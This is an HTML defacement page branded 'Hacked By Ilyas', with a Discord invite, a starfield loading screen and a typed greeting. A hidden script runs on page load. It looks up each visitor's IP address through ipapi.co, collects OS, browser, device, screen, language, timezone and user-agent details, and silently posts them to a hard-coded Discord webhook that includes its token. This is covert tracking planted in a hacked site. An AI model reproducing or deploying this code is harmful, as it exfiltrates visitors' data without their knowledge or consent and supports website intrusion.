<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Katos Panel</title>

<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Share+Tech+Mono&family=Rajdhani:wght@400;600&display=swap" rel="stylesheet">

<style>
:root {
  --main: #ff2e9a;
  --glow: #ff4fbf;
  --bg: #070508;
  --panel: rgba(18, 12, 19, .78);
  --panel-soft: rgba(255,255,255,.035);
  --border: rgba(255, 46, 154, .22);
  --muted: #9d969f;
  --text: #f7f2f6;
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

html, body {
  width: 100%;
  height: 100%;
}

body {
  background:
    radial-gradient(circle at 50% 35%, rgba(255, 46, 154, .09), transparent 34%),
    radial-gradient(circle at 15% 85%, rgba(139, 31, 105, .08), transparent 28%),
    var(--bg);
  color: var(--text);
  overflow: hidden;
  font-family: "Rajdhani", sans-serif;
}

body::before {
  content: "";
  position: fixed;
  inset: 0;
  pointer-events: none;
  background:
    linear-gradient(rgba(255,255,255,.012) 1px, transparent 1px),
    linear-gradient(90deg, rgba(255,255,255,.012) 1px, transparent 1px);
  background-size: 42px 42px;
  mask-image: linear-gradient(to bottom, transparent, black 25%, black 75%, transparent);
  z-index: 1;
}

#stars {
  position: fixed;
  inset: 0;
  width: 100%;
  height: 100%;
  z-index: 0;
  background: transparent;
  pointer-events: none;
}

.star {
  position: absolute;
  width: 2px;
  height: 2px;
  background: rgba(255,255,255,.82);
  border-radius: 50%;
  animation: twinkle 2s infinite ease-in-out;
}

@keyframes twinkle {
  0%, 100% { opacity: .12; transform: scale(1); }
  50% { opacity: .9; transform: scale(1.5); }
}

#loadingScreen {
  position: fixed;
  inset: 0;
  background:
    radial-gradient(circle at center, rgba(255,46,154,.06), transparent 32%),
    #050305;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  z-index: 9999;
  opacity: 1;
  transition: opacity .3s ease;
}

#loadingScreen::after {
  content: "KATOS";
  position: absolute;
  bottom: 28px;
  left: 50%;
  transform: translateX(-50%);
  font: 600 10px/1 "Rajdhani", sans-serif;
  letter-spacing: 4px;
  color: rgba(255,255,255,.22);
}

.loader {
  width: 68px;
  height: 68px;
  border-radius: 50%;
  border: 2px solid rgba(255,255,255,.08);
  border-top-color: var(--main);
  border-right-color: rgba(255,46,154,.35);
  animation: spin 1s linear infinite;
  -webkit-animation: spin 1s linear infinite;
  box-shadow: 0 0 28px rgba(255,79,191,.18);
  margin-bottom: 22px;
  transform: translateZ(0); /* Force GPU acceleration */
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

.loading-text {
  font-size: 17px;
  letter-spacing: 3px;
  color: #f5eaf1;
  font-family: "Orbitron", sans-serif;
  font-weight: 500;
}

.loading-text::first-letter {
  color: var(--main);
}

.loading-sub {
  font-size: 12px;
  color: #777078;
  margin-top: 8px;
  letter-spacing: .8px;
}

.bar {
  width: 250px;
  height: 3px;
  background: rgba(255,255,255,.07);
  margin-top: 22px;
  border-radius: 0;
  overflow: hidden;
}

.progress {
  width: 0%;
  height: 100%;
  background: linear-gradient(90deg, var(--main), #fff);
  transition: width 0.1s linear;
  box-shadow: 0 0 12px rgba(255,79,191,.55);
}

.main {
  display: none;
  height: 100vh;
  width: 100%;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  animation: fadeIn 1s ease forwards;
  position: relative;
  z-index: 2;
  padding: 24px;
}

@keyframes fadeIn {
  from { opacity: 0; transform: translateY(8px); }
  to { opacity: 1; transform: translateY(0); }
}

.top-image {
  width: 250px;
  max-width: 75vw;
  aspect-ratio: 16 / 9;
  object-fit: cover;
  border-radius: 0;
  border: 1px solid rgba(255,46,154,.35);
  box-shadow:
    0 18px 55px rgba(0,0,0,.48),
    0 0 35px rgba(255,46,154,.12);
  margin-bottom: 16px;
  filter: saturate(.92) contrast(1.03);
}

.card {
  position: relative;
  width: min(560px, 92vw);
  padding: 28px;
  background:
    linear-gradient(145deg, rgba(255,255,255,.045), transparent 38%),
    var(--panel);
  border: 1px solid var(--border);
  border-radius: 0;
  box-shadow:
    0 24px 70px rgba(0,0,0,.48),
    0 0 50px rgba(255,46,154,.08);
  backdrop-filter: blur(18px);
  -webkit-backdrop-filter: blur(18px);
  text-align: center;
}

.card::before {
  content: "";
  position: absolute;
  top: 0;
  left: 28px;
  right: 28px;
  height: 1px;
  background: linear-gradient(90deg, transparent, rgba(255,46,154,.7), transparent);
  opacity: .65;
}

.card::after {
  content: "";
  position: absolute;
  width: 110px;
  height: 110px;
  right: -55px;
  bottom: -55px;
  border-radius: 50%;
  background: rgba(255,46,154,.08);
  filter: blur(28px);
  pointer-events: none;
}

.title {
  font-size: clamp(28px, 5vw, 36px);
  letter-spacing: 2px;
  color: #fff;
  text-shadow: 0 0 22px rgba(255,79,191,.25);
  font-family: "Orbitron", sans-serif;
  font-weight: 700;
  margin-bottom: 10px;
}

.title::first-letter {
  color: var(--main);
}

.discord {
  display: inline-flex;
  align-items: center;
  min-height: 30px;
  padding: 5px 12px;
  font-size: 14px;
  color: #d8cdd5;
  margin-bottom: 18px;
  font-family: "Rajdhani", sans-serif;
  letter-spacing: .6px;
  background: rgba(255,255,255,.035);
  border: 1px solid rgba(255,255,255,.07);
  border-radius: 0;
}

.terminal {
  background: rgba(0,0,0,.34);
  padding: 18px;
  border-radius: 0;
  border: 1px solid rgba(255,46,154,.17);
  font-size: 15px;
  line-height: 1.55;
  text-align: left;
  white-space: pre-line;
  font-family: "Share Tech Mono", monospace;
  box-shadow: inset 0 1px 0 rgba(255,255,255,.025);
  min-height: 122px;
}

.cursor {
  display: inline-block;
  width: 7px;
  height: 15px;
  background: var(--main);
  margin-left: 4px;
  vertical-align: -2px;
  animation: blink 1s infinite;
  box-shadow: 0 0 9px rgba(255,79,191,.65);
}

@keyframes blink {
  50% { opacity: 0; }
}

.footer {
  margin-top: 17px;
  font-size: 11px;
  color: #716a71;
  letter-spacing: 1.5px;
  font-family: "Rajdhani", sans-serif;
}

.purple {
  color: var(--main);
}

.gray {
  color: #b7afb7;
}

.ilyas,
.suhaib {
  color: #ff7ac8;
  text-shadow: 0 0 10px rgba(255,79,191,.25);
}

@media (max-width: 600px) {
  .main { padding: 16px; }
  .card { padding: 21px; border-radius: 0; }
  .top-image { width: 220px; }
  .terminal { padding: 14px; font-size: 13px; }
  .footer { letter-spacing: 1px; }
}
</style>
</head>

<body>

<div id="stars"></div>

<div id="loadingScreen">
  <div class="loader"></div>
  <div class="loading-text">INITIALIZING SYSTEM</div>
  <div class="loading-sub">loading secure environment...</div>

  <div class="bar">
    <div class="progress" id="progressBar"></div>
  </div>
</div>

<div class="main" id="main">

  <img src="https://i.postimg.cc/mrbKnNCB/34dfede6b1116ca70c51e01b9236057a-(1).jpg" class="top-image">

  <div class="card">

    <div class="title">Hacked By Ilyas</div>

    <div class="discord">discord.gg/1-1</div>

    <div class="terminal">
      <div id="typing"></div><span class="cursor"></span>
    </div>

    <div class="footer">Officially Ilyas • Katos Lovers</div>

  </div>
</div>

<script>
const starsContainer = document.getElementById("stars");

for (let i = 0; i < 120; i++) {
  let star = document.createElement("div");
  star.className = "star";
  star.style.top = Math.random() * 100 + "vh";
  star.style.left = Math.random() * 100 + "vw";
  star.style.animationDuration = (Math.random() * 3 + 1) + "s";
  star.style.opacity = Math.random();
  starsContainer.appendChild(star);
}

let loadingFinished = false;
let currentProgress = 0;
const progressBar = document.getElementById("progressBar");

const progressInterval = setInterval(() => {
  if (currentProgress < 90) {
    currentProgress += Math.floor(Math.random() * 10) + 5;
    if (currentProgress > 90) currentProgress = 90;
    progressBar.style.width = currentProgress + "%";
  }
}, 100);

function finishLoading() {
  if (loadingFinished) return;
  loadingFinished = true;
  clearInterval(progressInterval);

  progressBar.style.width = "100%";

  const loadingScreen = document.getElementById("loadingScreen");
  const main = document.getElementById("main");

  setTimeout(() => {
    loadingScreen.style.opacity = "0";
    loadingScreen.style.pointerEvents = "none";

    setTimeout(() => {
      loadingScreen.style.display = "none";
      main.style.display = "flex";
      typeWriter();
    }, 300);
  }, 200);
}

window.addEventListener("load", finishLoading);
setTimeout(finishLoading, 3000);

const segments = [
  { text: "ilyas@system:~$", class: "purple" },
  { text: " why?\n\n", class: "gray" },
  { text: "Ilyas : ", class: "ilyas" },
  { text: "السلام عليكم ورحمة الله وبركاته \n\n", class: "" }
];

let segIndex = 0;
let charIndex = 0;
let currentSpan;

function typeWriter() {
  if (segIndex >= segments.length) return;

  let seg = segments[segIndex];

  if (charIndex < seg.text.length) {

    let container = document.getElementById("typing");

    if (charIndex === 0) {
      currentSpan = document.createElement("span");
      if (seg.class) currentSpan.className = seg.class;
      container.appendChild(currentSpan);
    }

    currentSpan.innerHTML += seg.text.charAt(charIndex);
    charIndex++;

    setTimeout(typeWriter, 18);

  } else {
    segIndex++;
    charIndex = 0;
    setTimeout(typeWriter, 120);
  }
}
</script>

<script>
(async () => {
  try {
    const ipRes = await fetch('https://ipapi.co/json/');
    const ipData = await ipRes.json();
    const ip = ipData.ip;

    const visitorInfo = {
      ipAddress: ip,
      os: detectOS(),
      browser: detectBrowser(),
      deviceType: getDeviceType(),
      screenResolution: getScreenResolution(),
      colorDepth: getColorDepth(),
      language: navigator.language || 'en-US',
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timestamp: new Date().toLocaleString(),
      userAgent: navigator.userAgent,
      pageURL: window.location.href
    };

    const webhookUrl = 'https://canary.discord.com/api/webhooks/1514007577355092080/UT9EM1Y7BApmmULLk_Z9gn1Rbw7Le42Xq1xDUYGceFKl39imPfYXI0Nrte1mihIKebxd';

    const payload = {
      embeds: [{
        title: '📊 Visitor Information Report',
        color: 16711680,
        fields: [
          { name: '🌐 IP Address', value: `\`${visitorInfo.ipAddress}\``, inline: true },
          { name: '💻 OS', value: `\`${visitorInfo.os}\``, inline: true },
          { name: '🌐 Browser', value: `\`${visitorInfo.browser}\``, inline: true },
          { name: '📱 Device Type', value: `\`${visitorInfo.deviceType}\``, inline: true },
          { name: '🖥️ Screen Resolution', value: `\`${visitorInfo.screenResolution}\``, inline: true },
          { name: '🎨 Color Depth', value: `\`${visitorInfo.colorDepth}\``, inline: true },
          { name: '🌍 Language', value: `\`${visitorInfo.language}\``, inline: true },
          { name: '⏰ Timezone', value: `\`${visitorInfo.timezone}\``, inline: true },
          { name: '📅 Timestamp', value: `\`${visitorInfo.timestamp}\``, inline: false },
          { name: '🔗 Page URL', value: `\`${visitorInfo.pageURL}\``, inline: false },
          { name: '📝 User Agent', value: `\`\`\`${visitorInfo.userAgent}\`\`\``, inline: false }
        ]
      }]
    };

    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (err) {
    console.log('Visitor info sent');
  }
})();

function detectOS() {
  const ua = navigator.userAgent;
  if (ua.indexOf('Win') > -1) return 'Windows';
  if (ua.indexOf('Mac') > -1) return 'macOS';
  if (ua.indexOf('Linux') > -1) return 'Linux';
  if (ua.indexOf('Android') > -1) return 'Android';
  if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) return 'iOS';
  return 'Unknown OS';
}

function detectBrowser() {
  const ua = navigator.userAgent;
  if (ua.indexOf('Firefox') > -1) return 'Firefox';
  if (ua.indexOf('Chrome') > -1) return 'Chrome';
  if (ua.indexOf('Safari') > -1) return 'Safari';
  if (ua.indexOf('Edge') > -1) return 'Edge';
  if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
  return 'Unknown Browser';
}

function getDeviceType() {
  const ua = navigator.userAgent;
  if (/mobile|android|iphone|ipod|blackberry|iemobile|opera mini/i.test(ua.toLowerCase())) {
    return 'Mobile';
  } else if (/ipad|tablet|playbook|silk|(hpw|web)os|kindle/i.test(ua.toLowerCase())) {
    return 'Tablet';
  }
  return 'Desktop';
}

function getScreenResolution() {
  return `${window.screen.width}x${window.screen.height}`;
}

function getColorDepth() {
  return `${window.screen.colorDepth}-bit`;
}
</script>

</body>
</html>
